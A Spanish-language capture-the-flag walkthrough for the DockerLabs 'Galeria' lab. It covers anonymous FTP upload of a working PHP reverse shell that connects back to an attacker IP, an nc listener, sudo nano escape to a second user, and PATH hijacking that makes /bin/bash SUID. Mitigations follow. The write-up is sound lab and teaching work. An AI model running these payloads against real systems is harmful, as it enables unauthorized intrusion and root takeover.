# galeria
Fuzzing web sencillo y vulnerabilidad file upload.
# 🖼️ Galeria — DockerLabs Writeup

> Writeup de la máquina **Galeria** de [DockerLabs](https://dockerlabs.es).
> Dificultad: **Fácil / Medio** · Categorías: `FTP anónimo` · `File Upload` · `GTFOBins (nano)` · `PATH Hijacking`

---

## 📋 Índice

- [Información de la máquina](#-información-de-la-máquina)
- [1. Reconocimiento](#1-reconocimiento)
- [2. Enumeración web](#2-enumeración-web)
- [3. Acceso inicial (FTP anónimo → RCE)](#3-acceso-inicial-ftp-anónimo--rce)
- [4. Estabilización de la shell](#4-estabilización-de-la-shell)
- [5. Escalada a `gallery` (sudo + nano)](#5-escalada-a-gallery-sudo--nano)
- [6. Escalada a `root` (PATH Hijacking)](#6-escalada-a-root-path-hijacking)
- [7. Resumen de la cadena](#7-resumen-de-la-cadena)
- [8. Mitigaciones](#8-mitigaciones)

---

## 🧾 Información de la máquina

| Dato | Valor |
|------|-------|
| IP víctima | `172.17.0.2` |
| IP atacante | `10.0.2.15` |
| Sistema | Ubuntu (contenedor Docker) |
| Servicios | `21/tcp` (FTP) · `80/tcp` (HTTP) |

---

## 1. Reconocimiento

Escaneo completo de puertos con Nmap:

```bash
sudo nmap -p- -sS -sC -sV -vvv -T5 -Pn -n 172.17.0.2
```

Resultado:

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Gallery
```

Dos cosas destacan:

- **FTP (vsftpd 3.0.5)** con **login anónimo permitido**.
- **HTTP (Apache 2.4.58)** sirviendo una web llamada *Gallery*.

---

## 2. Enumeración web

Fuzzing de directorios con Gobuster:

```bash
gobuster dir -u http://172.17.0.2/ \
  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
  -x php,txt,backup --exclude-length 10701
```

```
/gallery         (Status: 301) → http://172.17.0.2/gallery/
/server-status   (Status: 403)
```

Navegando por `/gallery/` encontramos **directory listing activo** en las subcarpetas de subidas:

```
http://172.17.0.2/gallery/uploads/          → handler.php, images/
http://172.17.0.2/gallery/uploads/images/   → image_1..7.jpg, ftp/, ...
```

> 🔑 **Punto clave:** la carpeta `uploads/images/` es accesible por web **y** listable. Si conseguimos escribir un `.php` ahí dentro, lo podremos ejecutar desde el navegador.

---

## 3. Acceso inicial (FTP anónimo → RCE)

El FTP anónimo nos da escritura sobre un directorio que se refleja en la web (`uploads/images/`). Aprovechamos esto para subir una **reverse shell en PHP**.

### 3.1 Conexión al FTP

```bash
ftp 172.17.0.2
# Usuario: anonymous
# Password: (vacío)
```

### 3.2 Subida de la webshell

Preparamos una reverse shell PHP (puedes generar una en [revshells.com](https://www.revshells.com) o usar la de pentestmonkey) apuntando a tu IP y puerto:

```php
<?php
// reverse_shell_automatica.php — ajusta IP y puerto
$ip = '10.0.2.15'; $port = 443;
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh -i', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>
```

La subimos por FTP:

```bash
ftp> put reverse_shell_automatica.php
```

### 3.3 Listener y ejecución

En Kali levantamos el listener:

```bash
nc -lnvp 443
```

Y desde el navegador (o con curl) ejecutamos la shell:

```
http://172.17.0.2/gallery/uploads/images/reverse_shell_automatica.php
```

Recibimos la conexión como `www-data`:

```
connect to [10.0.2.15] from (UNKNOWN) [172.17.0.2]
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## 4. Estabilización de la shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

Ahora tenemos una TTY interactiva y estable.

---

## 5. Escalada a `gallery` (sudo + nano)

Revisamos los permisos de sudo del usuario actual:

```bash
sudo -l
```

```
User www-data may run the following commands on 50db74bb668b:
    (gallery) NOPASSWD: /bin/nano
    (www-data) NOPASSWD: /bin/nano
```

Podemos ejecutar **`nano` como el usuario `gallery`** sin contraseña. `nano` está en [GTFOBins](https://gtfobins.github.io/gtfobins/nano/#sudo) porque permite ejecutar comandos externos.

```bash
sudo -u gallery /bin/nano
```

Una vez dentro de nano:

1. Pulsar **`Ctrl + R`** y luego **`Ctrl + X`** (ejecutar comando externo).
2. Introducir:

```bash
reset; sh 1>&0 2>&0
```

3. `Enter` → shell como `gallery`:

```bash
id
# uid=1001(gallery) gid=1001(gallery) groups=1001(gallery)
```

---

## 6. Escalada a `root` (PATH Hijacking)

Enumeramos sudo como `gallery`:

```bash
sudo -l
```

```
Matching Defaults entries for gallery on 50db74bb668b:
    env_reset, mail_badpass, env_keep+=PATH, use_pty

User gallery may run the following commands on 50db74bb668b:
    (ALL) NOPASSWD: /usr/local/bin/runme
```

Dos detalles que, **combinados**, son el fallo:

1. Podemos ejecutar `/usr/local/bin/runme` como **cualquier usuario** (incluido `root`) sin contraseña.
2. **`env_keep+=PATH`** → sudo **conserva nuestra variable `$PATH`** (y no hay `secure_path`).

### 6.1 Análisis del binario

`runme` es un ELF compilado de `runme.c`. Extrayendo sus *strings* vemos que llama a `system()` con un comando **relativo** (sin ruta absoluta):

```c
// Reconstrucción a partir de las strings
printf("Converting image...\n");
system("convert /var/www/html/gallery/uploads/images/input.png "
       "/var/www/html/gallery/uploads/images/output.jpg");
printf("Done.\n");
```

> `system()` lanza el comando a través de `/bin/sh -c`, que busca `convert` recorriendo el `$PATH`. Como sudo **conserva nuestro PATH**, podemos secuestrar `convert`.

### 6.2 Explotación

Creamos un `convert` malicioso que ponga el bit **SUID** a bash, lo situamos de primero en el `PATH` y ejecutamos el binario con sudo:

```bash
cd /tmp
printf '#!/bin/bash\nchmod u+s /bin/bash\n' > /tmp/convert
chmod +x /tmp/convert
export PATH=/tmp:$PATH
sudo /usr/local/bin/runme
```

Salida:

```
Converting image...
Done.
```

Root ha ejecutado nuestro `convert`. Ahora lanzamos bash preservando privilegios:

```bash
/bin/bash -p
id
# uid=1001(gallery) gid=1001(gallery) euid=0(root) groups=1001(gallery)
whoami
# root
```

### 6.3 Flag

```bash
cat /root/root.txt
```

### 6.4 Limpieza (buena práctica)

```bash
chmod u-s /bin/bash
```

---

## 7. Resumen de la cadena

```
FTP anónimo (escritura)
        │  subida de reverse_shell_automatica.php
        ▼
RCE vía web  ──►  www-data
        │  sudo -u gallery /bin/nano  (GTFOBins)
        ▼
      gallery
        │  sudo runme + env_keep+=PATH  (PATH Hijacking de 'convert')
        ▼
       root 👑
```

---

## 8. Mitigaciones

- **FTP:** deshabilitar el login anónimo (`anonymous_enable=NO`) o impedir que su directorio sea escribible y servible por el servidor web.
- **Subidas:** la carpeta `uploads/` no debe permitir ejecución de PHP (configurar Apache para no interpretar `.php` en ese directorio) ni directory listing (`Options -Indexes`).
- **sudo / nano:** no conceder `NOPASSWD` sobre editores como `nano` (permiten *command execution* — GTFOBins).
- **Binario `runme`:** usar **rutas absolutas** en las llamadas a `system()` (`/usr/bin/convert`) y, sobre todo, **eliminar `env_keep+=PATH`** del sudoers. Lo ideal es forzar `secure_path`.

---

### 📚 Referencias

- [GTFOBins — nano](https://gtfobins.github.io/gtfobins/nano/)
- [HackTricks — PATH Hijacking](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses)
- [DockerLabs](https://dockerlabs.es)

---
